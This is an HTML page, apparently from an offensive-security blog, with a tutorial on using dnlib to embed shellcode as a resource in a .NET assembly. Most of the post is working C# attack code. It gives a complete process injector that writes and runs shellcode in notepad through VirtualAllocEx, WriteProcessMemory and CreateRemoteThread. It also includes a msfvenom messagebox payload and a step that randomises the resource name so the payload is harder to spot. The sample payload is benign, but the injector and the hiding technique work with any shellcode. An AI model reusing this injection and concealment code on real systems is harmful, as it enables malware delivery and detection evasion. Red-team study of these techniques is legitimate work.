@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Embedding Resources with dnlib - Offensive Defence</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.74.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://offensivedefence.co.uk/css/main.min.f90f5edd436ec7b74ad05479a05705770306911f721193e7845948fb07fe1335.css" />
+    <script src="https://kit.fontawesome.com/89e1a73a2b.js" crossorigin="anonymous"></script>
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Embedding Resources with dnlib"/>
+<meta name="twitter:description" content="Intro In this post, I&rsquo;ll demonstrate how dnlib can be used to add embedded resources to an assembly.
+Injector Template I&rsquo;ve chosen a process injection scenario - where our application will retrieve shellcode that&rsquo;s embedded within it and then inject it into a target process.
+using System; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.InteropServices; namespace DemoApp { class Program { static void Main(string[] args) { var shellcode = GetEmbeddedResource(&#34;Shellcode&#34;); Inject(shellcode); } static byte[] GetEmbeddedResource(string resourceName) { var self = Assembly."/>
+
+    <meta property="og:title" content="Embedding Resources with dnlib" />
+<meta property="og:description" content="Intro In this post, I&rsquo;ll demonstrate how dnlib can be used to add embedded resources to an assembly.
+Injector Template I&rsquo;ve chosen a process injection scenario - where our application will retrieve shellcode that&rsquo;s embedded within it and then inject it into a target process.
+using System; using System.Diagnostics; using System.IO; using System.Reflection; using System.Runtime.InteropServices; namespace DemoApp { class Program { static void Main(string[] args) { var shellcode = GetEmbeddedResource(&#34;Shellcode&#34;); Inject(shellcode); } static byte[] GetEmbeddedResource(string resourceName) { var self = Assembly." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://offensivedefence.co.uk/posts/dnlib-embedded-resources/" />
+<meta property="article:published_time" content="2020-12-31T12:00:45+00:00" />
+<meta property="article:modified_time" content="2020-12-31T12:00:45+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://offensivedefence.co.uk"><img class="app-header-avatar" src="/avatar.png" alt="John Doe" /></a>
+      <h1>Offensive Defence</h1>
+      <p>&#34;The hand which strikes also blocks.&#34;</p>
+
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Embedding Resources with dnlib</h1>
+      <div class="post-meta">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+              <a class="tag" href="https://offensivedefence.co.uk/authors/rastamouse/">Rasta Mouse</a>
+        
+      
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 31, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
+        </div><div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+          <a class="tag" href="https://offensivedefence.co.uk/tags/c#/">c#</a><a class="tag" href="https://offensivedefence.co.uk/tags/.net/">.net</a><a class="tag" href="https://offensivedefence.co.uk/tags/dnlib/">dnlib</a></div></div>
+    </header>
+    <div class="post-content">
+      <h3 id="intro">Intro</h3>
+<p>In this post, I&rsquo;ll demonstrate how dnlib can be used to add embedded resources to an assembly.</p>
+<h3 id="injector-template">Injector Template</h3>
+<p>I&rsquo;ve chosen a process injection scenario - where our application will retrieve shellcode that&rsquo;s embedded within it and then inject it into a target process.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">using</span> System;
+<span style="color:#66d9ef">using</span> System.Diagnostics;
+<span style="color:#66d9ef">using</span> System.IO;
+<span style="color:#66d9ef">using</span> System.Reflection;
+<span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
+
+<span style="color:#66d9ef">namespace</span> DemoApp
+{
+    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span>
+    {
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args)
+        {
+            <span style="color:#66d9ef">var</span> shellcode = GetEmbeddedResource(<span style="color:#e6db74">&#34;Shellcode&#34;</span>);
+            Inject(shellcode);
+        }
+
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] GetEmbeddedResource(<span style="color:#66d9ef">string</span> resourceName)
+        {
+            <span style="color:#66d9ef">var</span> self = Assembly.GetExecutingAssembly();
+
+            <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> rs = self.GetManifestResourceStream(resourceName))
+            {
+                <span style="color:#66d9ef">if</span> (rs != <span style="color:#66d9ef">null</span>)
+                {
+                    <span style="color:#66d9ef">using</span> (<span style="color:#66d9ef">var</span> ms = <span style="color:#66d9ef">new</span> MemoryStream())
+                    {
+                        rs.CopyTo(ms);
+                        <span style="color:#66d9ef">return</span> ms.ToArray();
+                    }
+                }
+                <span style="color:#66d9ef">else</span>
+                {
+                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+                }
+            }
+        }
+
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Inject(<span style="color:#66d9ef">byte</span>[] shellcode)
+        {
+            <span style="color:#66d9ef">if</span> (shellcode == <span style="color:#66d9ef">null</span>)
+            {
+                Console.WriteLine(<span style="color:#e6db74">&#34;No shellcode found&#34;</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+
+            <span style="color:#66d9ef">var</span> notepad = Process.GetProcessesByName(<span style="color:#e6db74">&#34;notepad&#34;</span>)[<span style="color:#ae81ff">0</span>];
+            
+            <span style="color:#66d9ef">var</span> hProcess = OpenProcess(
+                <span style="color:#ae81ff">0</span>x001F0FFF,
+                <span style="color:#66d9ef">false</span>,
+                notepad.Id);
+
+            <span style="color:#66d9ef">var</span> alloc = VirtualAllocEx(
+                hProcess,
+                IntPtr.Zero,
+                (<span style="color:#66d9ef">uint</span>)shellcode.Length,
+                <span style="color:#ae81ff">0</span>x1000 | <span style="color:#ae81ff">0</span>x2000,
+                <span style="color:#ae81ff">0</span>x40);
+
+            WriteProcessMemory(
+                hProcess,
+                alloc,
+                shellcode,
+                (<span style="color:#66d9ef">uint</span>)shellcode.Length,
+                <span style="color:#66d9ef">out</span> UIntPtr bytesWritten);
+
+            CreateRemoteThread(
+                hProcess,
+                IntPtr.Zero,
+                <span style="color:#ae81ff">0</span>,
+                alloc,
+                IntPtr.Zero,
+                <span style="color:#ae81ff">0</span>,
+                IntPtr.Zero);
+        }
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr OpenProcess(
+            <span style="color:#66d9ef">int</span> dwDesiredAccess,
+            <span style="color:#66d9ef">bool</span> bInheritHandle,
+            <span style="color:#66d9ef">int</span> dwProcessId);
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr VirtualAllocEx(
+            IntPtr hProcess,
+            IntPtr lpAddress,
+            <span style="color:#66d9ef">uint</span> dwSize,
+            <span style="color:#66d9ef">uint</span> flAllocationType,
+            <span style="color:#66d9ef">uint</span> flProtect);
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;, SetLastError = true)]</span>
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> WriteProcessMemory(
+            IntPtr hProcess,
+            IntPtr lpBaseAddress,
+            <span style="color:#66d9ef">byte</span>[] lpBuffer,
+            <span style="color:#66d9ef">uint</span> nSize,
+            <span style="color:#66d9ef">out</span> UIntPtr lpNumberOfBytesWritten);
+<span style="color:#a6e22e">
+</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32.dll&#34;)]</span>
+        <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateRemoteThread(
+            IntPtr hProcess,
+            IntPtr lpThreadAttributes,
+            <span style="color:#66d9ef">uint</span> dwStackSize,
+            IntPtr lpStartAddress,
+            IntPtr lpParameter,
+            <span style="color:#66d9ef">uint</span> dwCreationFlags,
+            IntPtr lpThreadId);
+    }
+}
+</code></pre></div><p>This is rather self-explanatory, but let&rsquo;s walk through it briefly:</p>
+<ol>
+<li>Get an emdedded resource by the name <code>Shellcode</code>.</li>
+<li>Call the <code>Inject</code> method, passing in that shellcode.</li>
+<li>If <code>shellcode</code> is <code>null</code> (because the embedded resource did not exist), print to the console and return.  Otherwise, find an instance of <code>notepad</code> and inject the shellcode into it.</li>
+</ol>
+<p>If we compile and run this, we get the printed message as expected.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">C:\Temp&gt;DemoApp.exe
+No shellcode found
+</code></pre></div><h3 id="emdedding-the-shellcode">Emdedding the Shellcode</h3>
+<p>This is remarkably easy to do.  For this example, I&rsquo;ll define some static shellcode in my dnlib console app.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#75715e">// msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span>[] Shellcode = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[<span style="color:#ae81ff">323</span>] {
+    <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x81,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,
+    <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xd2,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x60,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
+    <span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,
+    <span style="color:#ae81ff">0</span>x0f,<span style="color:#ae81ff">0</span>xb7,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4a,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x02,
+    <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xe2,<span style="color:#ae81ff">0</span>xed,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x3e,
+    <span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>x88,
+    <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x74,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x48,
+    <span style="color:#ae81ff">0</span>x18,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>xe3,<span style="color:#ae81ff">0</span>x5c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x3e,
+    <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x34,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>xac,<span style="color:#ae81ff">0</span>x41,
+    <span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x0d,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xc1,<span style="color:#ae81ff">0</span>x38,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xf1,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x03,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x24,
+    <span style="color:#ae81ff">0</span>x08,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x39,<span style="color:#ae81ff">0</span>xd1,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>xd6,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x24,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,
+    <span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x0c,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x44,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x40,<span style="color:#ae81ff">0</span>x1c,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x3e,
+    <span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x04,<span style="color:#ae81ff">0</span>x88,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>xd0,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x5e,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x41,
+    <span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xec,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x52,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x58,<span style="color:#ae81ff">0</span>x41,
+    <span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x5a,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8b,<span style="color:#ae81ff">0</span>x12,<span style="color:#ae81ff">0</span>xe9,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>x5d,<span style="color:#ae81ff">0</span>x49,<span style="color:#ae81ff">0</span>xc7,<span style="color:#ae81ff">0</span>xc1,
+    <span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x8d,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>x1a,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x3e,<span style="color:#ae81ff">0</span>x4c,<span style="color:#ae81ff">0</span>x8d,
+    <span style="color:#ae81ff">0</span>x85,<span style="color:#ae81ff">0</span>x2b,<span style="color:#ae81ff">0</span>x01,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x31,<span style="color:#ae81ff">0</span>xc9,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>x45,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>x56,<span style="color:#ae81ff">0</span>x07,<span style="color:#ae81ff">0</span>xff,
+    <span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x1d,<span style="color:#ae81ff">0</span>x2a,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>xba,<span style="color:#ae81ff">0</span>xa6,<span style="color:#ae81ff">0</span>x95,<span style="color:#ae81ff">0</span>xbd,<span style="color:#ae81ff">0</span>x9d,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,
+    <span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xc4,<span style="color:#ae81ff">0</span>x28,<span style="color:#ae81ff">0</span>x3c,<span style="color:#ae81ff">0</span>x06,<span style="color:#ae81ff">0</span>x7c,<span style="color:#ae81ff">0</span>x0a,<span style="color:#ae81ff">0</span>x80,<span style="color:#ae81ff">0</span>xfb,<span style="color:#ae81ff">0</span>xe0,<span style="color:#ae81ff">0</span>x75,<span style="color:#ae81ff">0</span>x05,<span style="color:#ae81ff">0</span>xbb,<span style="color:#ae81ff">0</span>x47,<span style="color:#ae81ff">0</span>x13,
+    <span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6a,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x59,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x89,<span style="color:#ae81ff">0</span>xda,<span style="color:#ae81ff">0</span>xff,<span style="color:#ae81ff">0</span>xd5,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6c,<span style="color:#ae81ff">0</span>x6f,
+    <span style="color:#ae81ff">0</span>x2c,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x66,<span style="color:#ae81ff">0</span>x72,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x6d,<span style="color:#ae81ff">0</span>x20,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x53,<span style="color:#ae81ff">0</span>x46,<span style="color:#ae81ff">0</span>x21,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x4d,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x73,
+    <span style="color:#ae81ff">0</span>x73,<span style="color:#ae81ff">0</span>x61,<span style="color:#ae81ff">0</span>x67,<span style="color:#ae81ff">0</span>x65,<span style="color:#ae81ff">0</span>x42,<span style="color:#ae81ff">0</span>x6f,<span style="color:#ae81ff">0</span>x78,<span style="color:#ae81ff">0</span>x00 };
+</code></pre></div><p>The module definition has a <code>Resources</code> property which we can simply add a new <code>Resource</code> item to.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">var</span> module = ModuleDefMD.Load(<span style="color:#e6db74">@&#34;C:\Temp\DemoApp.exe&#34;</span>);
+module.Resources.Add(<span style="color:#66d9ef">new</span> EmbeddedResource(<span style="color:#e6db74">&#34;Shellcode&#34;</span>, Shellcode));
+module.Write(<span style="color:#e6db74">@&#34;C:\Temp\DemoAppEmbedded.exe&#34;</span>);
+</code></pre></div><p>Executing this assembly successfully injects the shellcode into notepad.</p>
+<p><img src="/images/dnlib-embedded-resources/static-resource-name.png" alt="" title="Shellcode Resources"></p>
+<h3 id="dynamic-resource-name">Dynamic Resource Name</h3>
+<p>We can also change the name of the resource to something random, rather than just &ldquo;Shellcode&rdquo;.</p>
+<p>This method will generate a pseudo-random string.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> GetRandomString(<span style="color:#66d9ef">int</span> len)
+{
+    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">string</span> chars = <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
+
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>(Enumerable.Repeat(chars, len)
+        .Select(s =&gt; s[<span style="color:#66d9ef">new</span> Random().Next(s.len)]).ToArray());
+}
+</code></pre></div><p>Our code can then be changed to:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">var</span> resourceName = GetRandomString(<span style="color:#ae81ff">10</span>);
+module.Resources.Add(<span style="color:#66d9ef">new</span> EmbeddedResource(resourceName, Shellcode));
+</code></pre></div><p>Now we have to update the call within <code>Main</code> of our target assembly to search for the correct resource name.  First, find the method.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#"><span style="color:#66d9ef">var</span> main = module.GetTypes()
+    .FirstOrDefault(t =&gt; t.Name == <span style="color:#e6db74">&#34;Program&#34;</span>).Methods
+    .FirstOrDefault(m =&gt; m.Name == <span style="color:#e6db74">&#34;Main&#34;</span>);
+</code></pre></div><p>Inspecting the current instructions on Main, we can see that &ldquo;Shellcode&rdquo; is passed via the <code>ldstr</code> OpCode.</p>
+<p><img src="/images/dnlib-embedded-resources/main-body.png" alt="" title="Main Instructions"></p>
+<p>With a string of comparable size, we can just overwrite the Operand.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c#" data-lang="c#">main.Body.Instructions[<span style="color:#ae81ff">1</span>].Operand = resourceName;
+</code></pre></div><p>Verify the changes in dnSpy and the assembly executes as previously.</p>
+<p><img src="/images/dnlib-embedded-resources/dnspy.png" alt="" title="dnSpy"></p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
